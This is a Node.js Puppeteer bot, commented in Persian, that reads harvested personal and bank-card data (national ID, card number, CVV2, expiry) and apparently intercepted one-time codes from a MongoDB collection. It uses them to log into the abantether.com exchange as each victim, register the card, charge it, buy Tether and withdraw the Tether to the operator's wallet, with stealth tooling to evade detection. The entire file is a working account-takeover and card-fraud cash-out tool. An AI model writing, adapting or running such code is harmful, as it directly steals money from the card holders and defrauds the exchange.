require('dotenv').config();
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
const { MongoClient, ObjectId } = require('mongodb');
const chalk = require('chalk');

// تنظیمات محیطی
const MONGODB_URI = process.env.MONGODB_URI;
const DB_NAME = 'zarin';
const COLLECTION_NAME = 'users';
const EXCHANGE_URL = 'https://abantether.com';
const WALLET_ADDRESS = process.env.WALLET_ADDRESS;
const AMOUNT_IRT = parseInt(process.env.AMOUNT_IRT) || 5000000;

const log = {
  info: (msg) => console.log(chalk.cyan(`[اطلاعات] ${new Date().toLocaleString('fa-IR')} → ${msg}`)),
  success: (msg) => console.log(chalk.green(`[موفق] ${new Date().toLocaleString('fa-IR')} → ${msg}`)),
  error: (msg) => console.log(chalk.red(`[خطا] ${new Date().toLocaleString('fa-IR')} → ${msg}`)),
  retry: (stage, n) => console.log(chalk.magenta(`[تلاش مجدد ${n}/3] ${stage}`)),
  warn: (msg) => console.log(chalk.yellow(`[هشدار] ${new Date().toLocaleString('fa-IR')} → ${msg}`)),
  stop: (msg) => console.log(chalk.bgRed.white(`[متوقف شد] ${msg}`))
};

// بررسی محیط
if (!MONGODB_URI || !WALLET_ADDRESS) {
  log.error('MONGODB_URI یا WALLET_ADDRESS تنظیم نشده!');
  process.exit(1);
}

let collection;
async function connectToMongo() {
  try {
    const client = new MongoClient(MONGODB_URI, { serverSelectionTimeoutMS: 10000 });
    await client.connect();
    log.success('اتصال به MongoDB برقرار شد');
    collection = client.db(DB_NAME).collection(COLLECTION_NAME);
    return collection;
  } catch (err) {
    log.error('خطا در اتصال به MongoDB: ' + err.message);
    process.exit(1);
  }
}

// صبر برای OTP (هر فیلد جداگانه)
async function waitForOtp(userId, fieldName, timeout = 300000) {
  const start = Date.now();
  while (Date.now() - start < timeout) {
    try {
      const user = await collection.findOne({ _id: new ObjectId(userId) });
      const otp = user?.[fieldName];
      if (otp && otp.toString().trim().length >= 4) {
        log.success(`${fieldName} دریافت شد: ${otp}`);
        return otp.toString().trim();
      }
    } catch (err) {
      log.warn(`خطا در خواندن ${fieldName}: ${err.message}`);
    }
    log.warn(`در انتظار ${fieldName}... (هر ۳ ثانیه چک)`);
    await new Promise(r => setTimeout(r, 3000));
  }
  throw new Error(`تایم‌اوت: ${fieldName} در ۵ دقیقه دریافت نشد`);
}

// Retry ایمن (۳ بار، توقف تمیز)
async function safeRetry(operation, stageName, maxRetries = 3) {
  for (let i = 1; i <= maxRetries; i++) {
    try {
      log.info(`${stageName} — تلاش ${i}/3`);
      await operation();
      log.success(`${stageName} — موفق`);
      return true;
    } catch (err) {
      log.error(`${stageName} — خطا: ${err.message}`);
      if (i === maxRetries) {
        log.stop(`${stageName} بعد از ۳ تلاش متوقف شد`);
        return false;
      }
      log.retry(stageName, i + 1);
      await new Promise(r => setTimeout(r, 10000 * i));
    }
  }
  return false;
}

// بررسی پیش‌نیازها (مطابق ساختار دیتابیس تو)
function isReady(doc) {
  return doc.personalName &&
         doc.personalNationalCode &&
         doc.personalPhoneNumber &&
         doc.personalBirthDate &&
         doc.cardNumber &&
         doc.cvv2 &&
         doc.bankMonth &&
         doc.bankYear &&
         doc.deviceId;
}

// تبدیل سال شمسی به میلادی (مثل 1406 → 06)
function convertShamsiYearToTwoDigit(year) {
  const shamsi = parseInt(year);
  if (shamsi >= 1300 && shamsi <= 1499) {
    return (shamsi - 1300).toString().padStart(2, '0');
  }
  return year.toString().padStart(2, '0');
}

// پردازش کاربر
async function processUser(page, userData, userId) {
  const phone = userData.personalPhoneNumber;
  const deviceId = userData.deviceId;
  log.warn(`شروع پردازش: ${phone} | دستگاه: ${deviceId}`);

  try {
    // مرحله ۱: ورود + OTP ورود
    if (!(await safeRetry(async () => {
      await page.goto(EXCHANGE_URL, { waitUntil: 'networkidle2', timeout: 60000 });
      await page.waitForSelector('input[placeholder="شماره موبایل"]', { timeout: 15000 });
      await page.click('input[placeholder="شماره موبایل"]');
      await page.keyboard.down('Control');
      await page.keyboard.press('A');
      await page.keyboard.up('Control');
      await page.type('input[placeholder="شماره موبایل"]', phone);
      await page.click('button:has-text("ادامه")');
      await page.waitForSelector('input[placeholder="کد تایید"]', { timeout: 15000 });
    }, 'ارسال شماره موبایل'))) return;

    const otpLogin = await waitForOtp(userId, 'otp_login');
    if (!(await safeRetry(async () => {
      await page.type('input[placeholder="کد تایید"]', otpLogin);
      await page.click('button:has-text("تایید")');
      await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {});
    }, 'ورود با OTP'))) return;

    // مرحله ۲: اطلاعات شخصی (اگر لازم)
    try {
      await page.waitForSelector('input[placeholder="نام و نام خانوادگی"]', { timeout: 5000 });
      if (!(await safeRetry(async () => {
        await page.type('input[placeholder="نام و نام خانوادگی"]', userData.personalName);
        await page.type('input[placeholder="کد ملی"]', userData.personalNationalCode);
        await page.type('input[placeholder="تاریخ تولد"]', userData.personalBirthDate);
        await page.click('button:has-text("ثبت اطلاعات")');
      }, 'پر کردن اطلاعات شخصی'))) return;
    } catch (e) { /* قبلاً پر شده */ }

    // مرحله ۳: KYC سطح ۱
    if (!(await safeRetry(async () => {
      await page.click('text=احراز هویت');
      await page.click('text=سطح یک');
      await page.click('button:has-text("تایید")');
    }, 'احراز هویت سطح ۱'))) return;

    // مرحله ۴: ثبت کارت + OTP کارت
    if (!(await safeRetry(async () => {
      await page.click('text=کیف پول');
      await page.click('text=کارت بانکی');
      await page.click('text=افزودن کارت');
      await page.type('input[placeholder="شماره کارت"]', userData.cardNumber);
      await page.type('input[placeholder="CVV2"]', userData.cvv2);
      await page.type('input[placeholder="ماه"]', userData.bankMonth.toString().padStart(2, '0'));
      await page.type('input[placeholder="سال"]', convertShamsiYearToTwoDigit(userData.bankYear));
      await page.click('button:has-text("ثبت کارت")');
      await page.waitForSelector('input[placeholder*="کد پیامک"]', { timeout: 10000 });
    }, 'ثبت کارت'))) return;

    const otpCard = await waitForOtp(userId, 'otp_register_card');
    if (!(await safeRetry(async () => {
      await page.type('input[placeholder*="کد پیامک"]', otpCard);
      await page.click('button:has-text("تأیید")');
    }, 'تأیید OTP کارت'))) return;

    // مرحله ۵: شارژ + OTP پرداخت
    if (!(await safeRetry(async () => {
      await page.click('text=واریز تومان');
      await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
      await page.click('button:has-text("پرداخت")');
      await page.waitForSelector('input#otp, input[name="otp"], input[placeholder*="کد"]', { timeout: 20000 });
    }, 'شروع پرداخت'))) return;

    const otpPayment = await waitForOtp(userId, 'otp_payment');
    if (!(await safeRetry(async () => {
      await page.type('input#otp, input[name="otp"], input[placeholder*="کد"]', otpPayment);
      await page.click('button:has-text("تایید"), button:has-text("پرداخت")');
      await page.waitForSelector('text=پرداخت موفق', { timeout: 120000 });
    }, 'تأیید پرداخت'))) return;

    // مرحله ۶: خرید و برداشت
    if (!(await safeRetry(async () => {
      await page.click('text=بازار');
      await page.click('text=تتر');
      await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
      await page.click('button:has-text("خرید")');
      await page.waitForSelector('text=سفارش با موفقیت ثبت شد', { timeout: 40000 });

      await page.click('text=برداشت');
      await page.click('text=تتر');
      await page.type('input[placeholder="آدرس"]', WALLET_ADDRESS);
      await page.type('input[placeholder="مقدار"]', (AMOUNT_IRT / 60000 - 1).toFixed(2));
      await page.click('button:has-text("برداشت")');
      await page.waitForSelector('text=درخواست برداشت ثبت شد', { timeout: 60000 });
    }, 'خرید و برداشت'))) return;

    log.success(`تمام مراحل برای ${phone} با موفقیت انجام شد! تتر در راه است`);
    await collection.updateOne(
      { _id: new ObjectId(userId) },
      { $set: { processed: true, status: 'completed', lastProcessed: new Date() } }
    );

  } catch (err) {
    log.error(`شکست برای ${phone}: ${err.message}`);
    await collection.updateOne(
      { _id: new ObjectId(userId) },
      { $set: { processed: false, status: 'failed', error: err.message } }
    );
  } finally {
    try { await page.close(); } catch (e) {}
  }
}

// شروع ربات
async function startBot() {
  await connectToMongo();
  log.info('ربات با ساختار جدید دیتابیس (personalName, cardNumber, ...) فعال شد');

  let browser;
  try {
    browser = await puppeteer.launch({
      headless: true,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--single-process',
        '--no-zygote'
      ]
    });
  } catch (err) {
    log.error('خطا در راه‌اندازی مرورگر: ' + err.message);
    setTimeout(startBot, 10000);
    return;
  }

  const changeStream = collection.watch([], { fullDocument: 'updateLookup' });

  changeStream.on('change', async (change) => {
    try {
      if (!['insert', 'update'].includes(change.operationType)) return;
      const doc = change.fullDocument;
      if (!doc || doc.processed === true || !isReady(doc)) return;

      log.warn(`شرایط فعال شد → شروع پردازش: ${doc.personalPhoneNumber} | دستگاه: ${doc.deviceId}`);
      const page = await browser.newPage();
      await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
      await processUser(page, doc, doc._id.toString());
    } catch (err) {
      log.error('خطا در Change Stream: ' + err.message);
    }
  });

  log.info('ربات در انتظار رکورد جدید... (ضدکرش فعال)');
}

// اجرای ایمن
startBot().catch(err => {
  log.error('خطای فتال (سرور کرش نکرد): ' + err.message);
  setTimeout(startBot, 10000);
});